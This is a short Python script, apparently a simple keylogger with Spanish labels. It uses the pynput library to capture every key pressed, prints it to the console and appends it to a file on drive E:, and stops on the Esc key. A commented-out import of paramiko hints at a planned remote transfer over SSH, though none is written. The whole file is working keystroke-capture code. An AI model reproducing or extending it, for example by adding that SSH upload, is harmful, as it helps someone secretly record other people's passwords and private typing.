from pynput import keyboard
#import paramiko

ubicacion='E:\\datos.txt'
f=open(ubicacion,'a')

def tecla_pres(key):
	print("Tecla presionada == {}".format(key))
	f.write(str(format(key)))
	if(str(key)=='Key.esc'):
		print("Saliendo ...")
		f.close()
		return False
		
with keyboard.Listener(tecla_pres) as listener:
	listener.join()